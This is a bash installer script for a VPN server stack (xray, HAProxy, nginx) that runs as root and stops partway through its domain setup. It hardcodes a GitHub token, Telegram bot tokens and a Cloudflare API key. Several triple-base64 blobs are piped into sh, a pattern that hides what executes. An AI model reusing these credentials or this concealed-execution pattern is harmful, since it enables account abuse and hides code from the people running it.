#!/bin/bash
# =========================================
# Quick Setup | Script Setup Manager
# Edition : Stable Edition V3.1
# Auther  : Geo Project
# (C) Copyright 2024
# =========================================

rm -rf /root/kc.sh > /dev/null 2>&1
if [ "${EUID}" -ne 0 ]; then
echo -e "${EROR} Please Run This Script As Root User !"
exit 1
fi
cat > /root/.profile <<EOF
clear
sleep 5
screen -r > /dev/null 2>&1
EOF
export RED='\033[0;31m'
export GREEN='\033[0;32m'
export YELLOW='\033[0;33m'
export BLUE='\033[0;34m'
export PURPLE='\033[0;35m'
export CYAN='\033[0;36m'
export LIGHT='\033[0;37m'
export NC='\033[0m'
GREEN="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${GREEN}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
IJO="\e[1;32m"
NC='\e[0m'
red='\e[1;31m'
GREEN='\e[0;32m'
export EROR="[${RED} ERROR ${NC}]"
export INFO="[${YELLOW} INFO ${NC}]"
export OKEY="[${GREEN} OKEY ${NC}]"
export PENDING="[${YELLOW} PENDING ${NC}]"
export SEND="[${YELLOW} SEND ${NC}]"
export RECEIVE="[${YELLOW} RECEIVE ${NC}]"
export BOLD="\e[1m"
export WARNING="${RED}\e[5m"
export UNDERLINE="\e[4m"
export GEO_VPN="https://installer.us.kg/"
export Server_URLL="raw.githubusercontent.com/jaka1m/perizinan/main"
export Server_Port="443"
export Server_IP="underfined"
export Script_Mode="Stable"
export Auther="geovpn"
export TOKEN="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"
export EMAIL="ambebalong@gmail.com"
export USER="jaka1m"
export MANGAP="1920212223242526272829303132333"
cd
echo 'V1ZoQ01FbEhiSFZqTTFKb1lrZDNaMkpIT1hOWk1rWXdTVU14TlVsRU5HZE1NbEpzWkdrNWRXUlhlSE5KUkVrclNtcEZTMW95Vm5SSlIyeDFZek5TYUdKSGQyZGlSemx6V1RKR01BPT0=' | base64 -d | base64 -d | base64 -d | sh
mkdir -p /etc/geovpn/
cat >/etc/geovpn/var.txt <<EOF
INFO_KILLS="5845302613:AAG1RCz3pxThj1ZvxT9BUT2T45r-nQ11190"
INFO_AKUN="5893916269:AAFoRG0z9y0Rewi6K3bF6_momM9Wyom6BGE"
INFO_BACKUP="5998346508:AAHZSmqWfOHMTxgk-na-vvliOnIw-bYtcso"
INFO_INSTALLER="6946747820:AAG0LHxHvy-e40ZpOwH0TuBQJEKM-Zj7Amc"
INFO_DAFTAR="6103018996:AAEFcFo8dELj4qMUrp3uxqqHsQO0xlGMr-k"
ADMIN="1467883032"
TIME="10"
EOF
source '/etc/geovpn/var.txt'
clear && clear && clear
export VERSION="3.1"
echo "${VERSION}" > /etc/${Auther}/version.db
function SAMAWA(){
clear
echo 'V2xkT2IySjVRV2xKUTFJM1VXdDRWbEpZTTJsc1NYcHBiRWxFYVd4SlJHbHNTVVJwYkVsRWFXeEpSR2xzU1VScGJFbEVhV3hKUkdsc1NVUnBiRWxFYVd4SlJHbHNTVVJwYkVsRWFXeEpSR2xzU1VScGJFbEVhV3hKUkdsc1NVUnBiRWxFYVd4SlJHbHNTVVJwYkVsRWFXeEpSR2xzU1VScGJFbEVhV3hKUkdsc1NVUnBiRWxFYVd4SlJHbHNTVVJwYkVsRWFXeEpSR2xzU1VScGJFbEVhV3hKUkdsc1NVUnBiRWxFYVd4SlJHbHNTVVJwYkVsRWFXeEpSR2xzU1VScGJFbEVhV3hKUkdsc1NVUnBiRWxFYVd4SlJHbHNTVVJwYkVsRWFXeEpSR2xzU1VScGJFbEVhV3hKUkdsc1NrRnJaVEExUkdaVFNVdGFWMDV2WW5sQmFVbERVamRSYTNoV1VsZ3phV3hKU1d0bE1EVkVabE5TTjFJeFNrWlNWVFU1U1VOQlowbERRV2RKUTBGbldERTVabGg1UW1aWU1UbG1XSGxDWmxneE9XWlllVUZuU1VOQloxZ3hPV1pZTVRsbVNVTkNaa2xEUVdkWWVWSTNWR3RPT1VwSWRFTlVSbFpHWmxOQlowbERRV2RKUTBGblNVTkVhV3hKU1d0bE1EVkVabE5KUzFwWFRtOWllVUZwU1VOU04xRnJlRlpTV0ROcGJFbEphMlV3TlVSbVUxSTNVakZLUmxKVk5UbEpRMEZuU1VOQlowbERRWFpKUmpsbVdETjNaMWd4T1daWWVUaG5XSGxDWTBsR2QyZEpRMEYyU1VNNFowbEdPR2RZU0hkbldFTkNPRWxJZDJ0bE1EVkVabE5TTjFGcmVGWlNXREJuU1VOQlowbERRV2RKUTBScGJFbEphMlV3TlVSbVUwbExXbGRPYjJKNVFXbEpRMUkzVVd0NFZsSllNMmxzU1VsclpUQTFSR1pUVWpkU01VcEdVbFUxT1VsRFFXZEpRMEZuU1VoM1oyWkRRV2RZTTNkblNVWTVPR1pEUWpoSlNIZG5XRU5DWTBsRE9HZE1NM2RuWmtZNGNFbElkMmRKUm5nNFNVaDNhMlV3TlVSbVUxSTNVV3Q0VmxKWU1HZEpRMEZuU1VOQlowbERSR2xzU1VsclpUQTFSR1pUU1V0YVYwNXZZbmxCYVVsRFVqZFJhM2hXVWxnemFXeEpTV3RsTURWRVpsTlNOMUl4U2taU1ZUVTVTVU5CWjBsRFFXZEpTSGRuWmtZNU9FbElkMmRtUmpsbVprTkNPRmd6ZDJkbVJuZG5WbWxCZGtsSWQyZEpSamxtVEROM1oyWkdkMmRKU0hkclpUQTFSR1pUVWpkUmEzaFdVbGd3WjBsRFFXZEpRMEZuU1VORWFXeEpTV3RsTURWRVpsTkpTMXBYVG05aWVVRnBTVU5TTjFGcmVGWlNXRE5wYkVsSmEyVXdOVVJtVTFJM1VqRktSbEpWTlRsSlEwRm5TVU5CWjBsRFFtTllNVGxtV0RONFpsZ3hPV1pZTVhobVdERTRka2xEUW1OWWVUaG5TVWg0Wm1aRFFXZEpTSGhtWmtOQ1kxZ3pkMnRsTURWRVpsTlNOMUZyZUZaU1dEQm5TVU5CWjBsRFFXZEpRMFJwYkVsSmEyVXdOVVJtVTBsTFdsZE9iMko1UVdsSlExSTNVV3Q0VmxKWU0ybHNTVWxyWlRBMVJHWlRRV2RKUTBGblNVTkJaMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEpRMEZuU1VOQlowbERRV2RKUTBGblNVTkJaMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEpRMEZuU1VOQmEyVXdTazFXVlZZNVNVOUxWV2RwVWpkVWEwNDVTV2R3YkZreWFIWkpRMGxuU2toMFExUkdWa1ptWlV0VloybFNOMVJyVGpsSlEwRm5TVU5CWjBsRFFXZEpRMEZuU1VVeFZsUkdVa3BWUlRsVFZrTkNWMVZGTkdkVk1FNVRVMVpDVlVsR1dYcE1ha1ZuU1VOQlowbERRV2RKUTBGblNVTkJaMGxEVWpkUmEzaFdVbGd3WnpSd1UwTktTSFJQVVRNd2FVTnRWbXBoUnpoblNXbEJhMlV3U2sxV1ZWWTVOSEJUUTBwSWRFOVJNekJuU1VOQlowbERRV2RKUTBGblNVTkJaMGxEUVdkSlEwRm5WakZrV0V4clpFWlVNVnBSVkdrMVJGUXdNR2RKUTBGblNVTkJaMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEtTSFJEVkVaV1JtWlRSR2xzU1VsclpUQTFSR1pUU1V0YVYwNXZZbmxCYVVsRFVqZFJhM2hXVWxnemFXeEpTV3RsTURWRVpsTkJaMGxEUWxWU1ZYaEdVakZLUWxSVFFrUlRRMEZyWlRCa1UxSlZWazltVlVJd1dsaE9NR0ZYZERGbFZqbDBXVmMxYmtwSWRFOVJNekJuVVZWU1RsTlZOR2RLU0hSSVZXdFdSbFJ1TVVGa1IwWXhXRE5PYUdKWFJqTlpVMUkzVkd0T09VbERRV2RKUTFJM1VXdDRWbEpZTUdjMGNGTkRTa2gwVDFFek1HbERiVlpxWVVjNFowbHBRV3RsTUVwTlZsVldPVFJ3VTFVMGNGTkJOSEJUUVRSd1UwRTBjRk5CTkhCVFFUUndVMEUwY0ZOQk5IQlRRVFJ3VTBFMGNGTkJOSEJUUVRSd1UwRTBjRk5CTkhCVFFUUndVMEUwY0ZOQk5IQlRRVFJ3VTBFMGNGTkJOSEJUUVRSd1UwRTBjRk5CTkhCVFFUUndVMEUwY0ZOQk5IQlRRVFJ3VTBFMGNGTkJOSEJUUVRSd1UwRTBjRk5CTkhCVFFUUndVMEUwY0ZOQk5IQlRRVFJ3VTBFMGNGTkJOSEJUUVRSd1UwRTBjRk5CTkhCVFFUUndVMEUwY0ZOQk5IQlRRVFJ3VTBFMGNGTkJOSEJUUVRSd1UwRTBjRk5CTkhCVFFUUndVMEUwY0ZOQk5IQlRRVFJ3VTFsS1NIUlBVVE13YVE9PQ==' | base64 -d | base64 -d | base64 -d | sh
}
clear
function print_ok() {
echo -e "${OK} ${BLUE} $1 ${FONT}"
}
function print_install() {
echo -e "${YELLOW} ╔════════════════════════════════════════════╗ ${FONT}"
echo -e " ║ ( $1 ) " | lolcat
echo -e "${YELLOW} ╚════════════════════════════════════════════╝ ${FONT}"
sleep 1
}
function print_error() {
echo -e "${ERROR} ${REDBG} $1 ${FONT}"
}
function print_success() {
if [[ 0 -eq $? ]]; then
echo -e "${YELLOW} ╔════════════════════════════════════════════╗ ${FONT}"
echo -e " ║ ( $1 ) BERHASIL DIPASANG" | lolcat
echo -e "${YELLOW} ╚════════════════════════════════════════════╝ ${FONT}"
sleep 2
fi
}
function is_root() {
if [[ 0 == "$UID" ]]; then
print_ok "Root user Start installation process"
else
print_error "The current user is not the root user, please switch to the root user and run the script again"
fi
}
print_install "MEMBUAT DIRECTORY XRAY"
mkdir -p /etc/xray
curl -s ifconfig.me > /etc/xray/ipvps
touch /etc/xray/domain
mkdir -p /var/log/xray
chown www-data.www-data /var/log/xray
chmod +x /var/log/xray
touch /var/log/xray/access.log
touch /var/log/xray/error.log
while IFS=":" read -r a b; do
case $a in
"MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
"Shmem") ((mem_used+=${b/kB}))  ;;
"MemFree" | "Buffers" | "Cached" | "SReclaimable")
mem_used="$((mem_used-=${b/kB}))"
;;
esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))"
Ram_Total="$((mem_total / 1024))"
export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
export Kernel=$( uname -r )
export Arch=$( uname -m )
export IP=$( curl -s ifconfig.me )
function first_setup(){
clear
timedatectl set-timezone Asia/Jakarta
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
export RED='\033[0;31m'
export GREEN='\033[0;32m'
export YELLOW='\033[0;33m'
export BLUE='\033[0;34m'
export PURPLE='\033[0;35m'
export CYAN='\033[0;36m'
export LIGHT='\033[0;37m'
export NC='\033[0m'
OR='\033[0;34m'
Lred='\e[91m'
LLgreen='\e[92m'
Lyellow='\e[93m'
yellow="\033[1;33m"
green="\e[92;1m"
yellow="\033[1;33m"
cyan="\033[1;36m"
clear
green="\e[92;1m"
NC='\033[0m'
SAMAWA
echo -e " ${BLUE}         ┌────────────────────────────────────┐${NC}"
echo -e " ${BLUE}         │$NC$L1\033[41m          INSTALLER HAProxy         $NC\033[0;34m│$NC"
echo -e " ${BLUE}         └────────────────────────────────────┘${NC}"
echo -e "$L1          Pilih Sesuai OS Anda ${GREEN}$L1 $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') ${NC}"
echo -e " ${BLUE}         ┌────────────────────────────────────┐${NC}"
echo -e " ${BLUE}         │$NC[${GREEN}01${NC}]$L1 INSTALLER UBUNTU $NC( ${GREEN}20.04 LTS${NC} ) $NC\033[0;34m│$NC"
echo -e " ${BLUE}         │$NC[${GREEN}02${NC}]$L1 INSTALLER UBUNTU $NC( ${GREEN}18.04 LTS${NC} ) $NC\033[0;34m│$NC"
echo -e " ${BLUE}         │$NC[${GREEN}03${NC}]$L1 INSTALLER DEBIAN $NC( ${GREEN}Debian 10/11${NC} ) $NC\033[0;34m│$NC"
echo -e " ${BLUE}         └────────────────────────────────────┘${NC}"
echo -e ""
                         read -p "Select [ 1 - 3 ] : " menu
case $menu in
1 | 01)
#Focal (20.04 LTS) and Jammy (22.04 LTS)
clear
print_install "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
sudo apt update -y > /dev/null 2>&1
apt-get -y install --no-install-recommends software-properties-common > /dev/null 2>&1
add-apt-repository ppa:vbernat/haproxy-2.8 -y
apt-get update > /dev/null 2>&1
apt-get -y install haproxy=2.8.\* > /dev/null 2>&1
    ;;
2 | 02)
#Bionic (18.04 LTS) 
clear
print_install "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
apt-get -y install --no-install-recommends software-properties-common > /dev/null 2>&1
add-apt-repository ppa:vbernat/haproxy-2.6 > /dev/null 2>&1
apt-get update > /dev/null 2>&1
apt-get -y install haproxy=2.6.\* > /dev/null 2>&1
    ;;
3 | 03)
#Buster (Debian 10/11)
clear
apt-get -y install --no-install-recommends software-properties-common > /dev/null 2>&1
print_install "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
curl https://haproxy.debian.net/bernat.debian.org.gpg | gpg --dearmor > /usr/share/keyrings/haproxy.debian.net.gpg > /dev/null 2>&1
echo "deb [signed-by=/usr/share/keyrings/haproxy.debian.net.gpg] http://haproxy.debian.net buster-backports-2.4 main" | sudo tee /etc/apt/sources.list.d/haproxy.list
apt-get update > /dev/null 2>&1
sudo apt install haproxy=2.4.*
    ;;
esac
print_success "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
}

#function DDoS_Deflate(){
#clear
#print_install "MEMASANG DDoS-Deflate"
#wget -qO /usr/sbin/ddos.zip "${GEO_VPN}ssh/ddos.zip" >/dev/null 2>&1
#unzip /usr/sbin/ddos.zip -d /usr/sbin/
#rm -rf /usr/sbin/ddos.zip
#chmod +x /usr/sbin/ddos-deflate-master/*
#cd /usr/sbin/ddos-deflate-master
#./uninstall.sh && ./install.sh
#print_success "DDoS-Deflate"
#}
function ins_nginx() {
clear
if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
print_install "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
sudo apt-get install nginx -y
elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
apt -y install nginx
/etc/init.d/nginx restart
/etc/init.d/nginx status
else
echo -e " Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${FONT} )"
fi
print_success "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
}
function base_package() {
clear
print_install "MENGINSTALL PACKET YANG DIBUTUHKAN"
echo -e "${GREEN}Starting ${NC}update...${NC}"
apt update -y > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}upgrade...${NC}"
apt upgrade -y > /dev/null 2>&1
apt install -y pkg-config  > /dev/null 2>&1
apt install -y libpam0g-dev  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install zip...${NC}"
apt install zip > /dev/null 2>&1
apt install -y make > /dev/null 2>&1
apt install -y cmake  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install openssl...${NC}"
apt install openssl -y > /dev/null 2>&1
apt install -y gnupg  > /dev/null 2>&1
apt install -y gnupg2  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install cron...${NC}"
apt install -y bison  > /dev/null 2>&1
apt install -y make  > /dev/null 2>&1
sudo apt-get remove --purge exim4 -y > /dev/null 2>&1
apt install cron -y > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install ntpdate...${NC}"
apt install ntpdate -y > /dev/null 2>&1
apt install -y chronyc sourcestats > /dev/null 2>&1
apt install -y chronyc tracking -v > /dev/null 2>&1
apt install -y apt install ntpdate > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install figlet...${NC}"
apt install figlet -y > /dev/null 2>&1
apt install -y ntpdate pool.ntp.org > /dev/null 2>&1
apt install bash-completion -y > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install fail2ban...${NC}"
apt install -y libcap-ng-dev  > /dev/null 2>&1
apt install -y libcap-ng-utils  > /dev/null 2>&1
apt install fail2ban -y > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}remove --purge exim4...${NC}"
apt install -y libselinux1-dev  > /dev/null 2>&1
apt install -y libcurl4-nss-dev  > /dev/null 2>&1
apt install -y flex  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}remove --purge ufw firewalld...${NC}"
apt install -y libnss3-tools  > /dev/null 2>&1
apt install -y libevent-dev  > /dev/null 2>&1
apt install -y bc  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install curl...${NC}"
apt install -y sed  > /dev/null 2>&1
apt install -y dirmngr  > /dev/null 2>&1
apt install -y libxml-parser-perl  > /dev/null 2>&1
apt install -y build-essential  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install git...${NC}"
apt install -y htop  > /dev/null 2>&1
apt install -y lsof  > /dev/null 2>&1
apt install -y tar  > /dev/null 2>&1
apt install -y wget  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install jq...${NC}"
apt install jq -y > /dev/null 2>&1
apt install -y libc6  > /dev/null 2>&1
apt install -y util-linux  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install psmisc...${NC}"
apt install psmisc -y > /dev/null 2>&1
apt install -y lsb-release  > /dev/null 2>&1
apt install -y shc  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install nginx...${NC}"
systemctl stop nginx > /dev/null 2>&1
systemctl stop apache2 > /dev/null 2>&1
systemctl stop haproxy > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}no-install-recommends...${NC}"
software-properties-common -y > /dev/null 2>&1
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
echo -e "${GREEN}Starting ${NC}install speedtest-cli ...${NC}"
apt install -y speedtest-cli > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install make...${NC}"
apt install -y bash-completion  > /dev/null 2>&1
apt install -y ntpdate > /dev/null 2>&1
apt install -y chrony > /dev/null 2>&1
apt install -y openvpn > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install dos2unix...${NC}"
apt install -y dos2unix > /dev/null 2>&1
apt install -y apt libnss3-dev  > /dev/null 2>&1
apt install -y libnspr4-dev  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install python...${NC}"
apt install -y python > /dev/null 2>&1
apt install -y easy-rsa > /dev/null 2>&1
apt install -y tmux > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install htop...${NC}"
apt install -y htop > /dev/null 2>&1
apt install -y gnupg1 > /dev/null 2>&1
apt install -y dnsutils > /dev/null 2>&1
apt install -y cron > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install tar...${NC}"
apt install -y tar > /dev/null 2>&1
apt install -y git > /dev/null 2>&1
apt install -y screen > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install wget...${NC}"
apt install -y wget > /dev/null 2>&1
apt install -y net-tools  > /dev/null 2>&1
apt install -y ca-certificates  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install curl...${NC}"
apt install -y curl > /dev/null 2>&1
apt install -y iptables  > /dev/null 2>&1
apt install -y iptables-persistent   > /dev/null 2>&1
apt install -y netfilter-persistent   > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install zip...${NC}"
apt install -y zip > /dev/null 2>&1
apt install -y p7zip-full  > /dev/null 2>&1
apt install -y python3-pip  > /dev/null 2>&1
apt install git -y > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install unzip...${NC}"
apt install -y curl  > /dev/null 2>&1
apt install -y ruby  > /dev/null 2>&1
apt install -y zip  > /dev/null 2>&1
apt install -y unzip  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install p7zip-full...${NC}"
apt install -y p7zip-full > /dev/null 2>&1
apt install -y gcc  > /dev/null 2>&1
apt install -y g++  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install python3-pip...${NC}"
apt install -y python3-pip > /dev/null 2>&1
apt install -y libssl-dev  > /dev/null 2>&1
apt install -y libsqlite3-dev  > /dev/null 2>&1
sudo apt-get remove --purge ufw firewalld -y > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install bsd-mailx...${NC}"
apt install -y iptables > /dev/null 2>&1
apt install -y rsyslog  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install iptables-persistent...${NC}"
apt install -y iptables-persistent > /dev/null 2>&1
apt install -y dos2unix  > /dev/null 2>&1
apt install -y zlib1g-dev  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install netfilter-persistent...${NC}"
apt install -y netfilter-persistent > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install python...${NC}"
apt install -y python  > /dev/null 2>&1
apt install curl -y > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install openvpn...${NC}"
apt install -y openvpn > /dev/null 2>&1
apt install -y xz-utils > /dev/null 2>&1
apt install -y apt-transport-https  > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install easy-rsa...${NC}"
apt install -y easy-rsa > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install tmux...${NC}"
apt install -y tmux > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install squid...${NC}"
apt install -y squid > /dev/null 2>&1
apt install -y make > /dev/null 2>&1
echo -e "${GREEN}Starting ${NC}install socat...${NC}"
apt install -y socat> /dev/null 2>&1
echo -e ""
print_success "PACKET YANG DIBUTUHKAN"
}
function ins_domain_ns() {
clear
Random_Number=$( </dev/urandom tr -dc 1-$( curl -s ${GEO_VPN}ssh/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
Domain_Hasil_Random=$( curl -s ${GEO_VPN}ssh/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
SUB_DOMAIN="$(</dev/urandom tr -dc a-x1-9 | head -c5 | tr -d '\r' | tr -d '\r\n')"
EMAIL_CLOUDFLARE="ambebalong@gmail.com"
API_KEY_CLOUDFLARE="5fae9fcb9c193ce65de4b57689a94938b708e"
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" | jq -r .result[0].id)
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"NS","name":"'ns.${SUB_DOMAIN}'","content":"'${SUB_DOMAIN}.${Domain_Hasil_Random}'","ttl":0,"proxied":false}' | jq -r .result.id)
RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"NS","name":"'ns.${SUB_DOMAIN}'","content":"'${SUB_DOMAIN}.${Domain_Hasil_Random}'","ttl":0,"proxied":false}')
echo "ns.$SUB_DOMAIN.$Domain_Hasil_Random" > /etc/xray/ns.txt
}
clear
function ins_domain() {
echo -e ""
clear
SAMAWA
echo 'V2xkT2IySjVRV2xKUTBGclpUQmtVMUpWVms5bVZXeDFXa2M1ZFZwWVRuQlpWelJuVkVkR2RWb3pWbWhhTWxWclpUQTFSR1pUU1V0YVYwNXZZbmxCYVVsRFFXdGxNV3hHVkVWNFVGWXpNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRVamRVYTA0NVNXZHdiRmt5YUhaSlEwbG5TVVZHVDFKRlJXZFRWVFZJVTFVMFoxUlZWazlTTUdSV1ZHdEdURkZWTkdkU1JUbE9VVlZzVDBsR1FsTlRWVXBDVWtWcloxQjVTVXRhVjA1dllubEJhVWxEUWtKV1JVWldTVVZzVDFJd2JFOUpSVEZHVkd0a1NGWlZOVUpUTUVaUFNVVlNVRlJWUmtwVWFVSlFWa1U1VGxGV1VrcFZlVUV2U1dkd2JGa3lhSFpKUTBsblNVVndTbE13UldkVFZUVklVMVUwWjFSVlZrOVNNR1JXVkd0R1RGRlZOR2RTUlRsT1VWVnNUMGxHUWxOVFZVcENVa1ZyYzBsRmRFWldSV3hNU1VOU04xSXhTa1pTVlRVNVRWTlNOMVJyVGpsSlozQnNXVEpvZGtsRFNXZEpSVkpvWW1sQ1MxTlZkRUpKUld4UFVqQnNUMGxGTVVaVWEyUklWbFUxUWxNd1JrOUpSVkpRVkZWR1NsUnBRbEJXUlRsT1VWWlNTbFY1ZDJkVE1GWlZVMVZ6WjBwSWRFaFZhMVpHVkc0d2VVcElkRTlSTXpCcFEyMVdhbUZIT0dkSmFVRm5Ta2gwV2xKVmVFMVVNV1E1VEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekJyWlRBMVJHWlRTVXRhVjA1dllubEJhVWxuY0d4Wk1taDJTVU5KWjBsRFVqZFNNVXBHVWxVMU9WSlhOVzVpUjJ4NllVTkNUVmxYTlc1a1YwWnVXbE5TTjFSclRqbEpaM0JzV1RKb2RrbERTV2RKUTFJM1YxVldUVlJGT1ZobVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSS1NIUlBVVE13YVVOdFZtcGhSemhuU1dsQloxZFZPVlpKUm1SQ1ZHeFJaMVpGT0dkV1ZrNUdTVVZGWjFWR1NrcFdhMFpWVWxOQ1JWUXdNVUpUVlRSblVIbEpTMXBYVG05aWVVRnBTVU5DVUZWcFFsaFJWVFZWU1VaU1VFbEdWbFJTVTBKQ1ZsWlNVRWxGVWxCVVZVWktWR2xCTDBsbmNHeFpNbWgyU1VOSlowbEZiRWRKUm14UVZsTkNXRkZWTlZWSlJsWlVVMVUxU0VsR1FsTlRWbHBDVmtWVloxSkZPVTVSVld4UFRFTkNWVmRXUWtaSlExSTNVakZLUmxKVk5UbE5VMUkzVkd0T09VbG5jR3haTW1oMlNVTkpaMGxGVmsxVk1GVm5WMVU1VmtsR1pFSlViRkZuVmxaT1NsUnJZMmRSVmxaVlZEQXhRbFpGYkVSSlJWSlFWRlZHU2xScGQyZFdSbXhSVWxOQmEyVXdaRk5TVlZaUFpsUkphMlV3TlVSbVUwbExXbGRPYjJKNVFXbEpRMEZyWlRGc1JsUkZlRkJXTXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVTFJM1ZHdE9PVWxuY0d4Wk1taDJTVU5KYVE9PQ==' | base64 -d | base64 -d | base64 -d | sh
read -p "$( echo -e "${GREEN}  Input Your Choose ? ${NC}(${YELLOW}1/2${NC})${NC} " )" choose_domain
if [[ $choose_domain == "2" ]]; then # // Using Automatic Domain
Random_Number=$( </dev/urandom tr -dc 1-$( curl -s ${GEO_VPN}ssh/domain.list | grep -E Jumlah | cut -d " " -f 2 | tail -n1 ) | head -c1 | tr -d '\r\n' | tr -d '\r')
Domain_Hasil_Random=$( curl -s ${GEO_VPN}ssh/domain.list | grep -E Domain$Random_Number | cut -d " " -f 2 | tr -d '\r' | tr -d '\r\n')
SUB_DOMAIN="$(</dev/urandom tr -dc a-x1-9 | head -c5 | tr -d '\r' | tr -d '\r\n')"
EMAIL_CLOUDFLARE="ambebalong@gmail.com"
API_KEY_CLOUDFLARE="5fae9fcb9c193ce65de4b57689a94938b708e"
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
